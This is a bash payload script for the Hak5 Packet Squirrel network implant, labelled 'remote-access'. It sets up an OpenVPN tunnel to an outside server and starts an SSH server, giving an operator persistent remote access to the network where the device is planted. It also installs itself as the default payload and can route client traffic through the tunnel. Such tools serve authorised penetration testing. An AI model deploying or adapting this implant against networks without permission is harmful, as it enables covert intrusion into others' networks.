#!/bin/bash
# 
# This payload is for the original Packet Squirrel.  It may not work on 
# the Packet Squirrel Mark II
# 
# Title:		OpenVPN
# Description:	Create a connection to a VPN-connection to an OpenVPN-server. Optionally: Send traffic from the clients through said tunnel.
# Author: 		Hak5
# Version:		1.0
# Category: 	remote-access
# Target: 		Any
# Net Mode:		BRIDGE, VPN

# Set to 1 to allow clients to use the VPN
FOR_CLIENTS=0

DNS_SERVER="8.8.8.8"

# Cheap hack to set the DNS server
function setdns() {
	while true
	do
		[[ ! $(grep -q "$DNS_SERVER" /tmp/resolv.conf) ]] && {
			echo -e "search lan\nnameserver $DNS_SERVER" > /tmp/resolv.conf
		}
		sleep 5
	done
}

function start() {
	LED SETUP

	DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)

	# Update factory default payload
	cp ${DIR}/payload.sh /root/payloads/switch3/payload.sh

	# Set NETMODE to BRIDGE and wait 3 seconds
	# to ensure that things can settle
	
	[[ "$FOR_CLIENTS" == "1" ]] && {
		/usr/bin/NETMODE VPN
	} || {
		/usr/bin/NETMODE BRIDGE
	}
	sleep 3

	# Make OpenVPN use the local configuration
	uci set openvpn.vpn.config="${DIR}/config.ovpn"
	uci commit

	# Start the OpenVPN server in the background
	/etc/init.d/openvpn start

	# Start SSH Server
	/etc/init.d/sshd start &

	# Set DNS server
	setdns &

	LED ATTACK
}

# Start the payload
start &
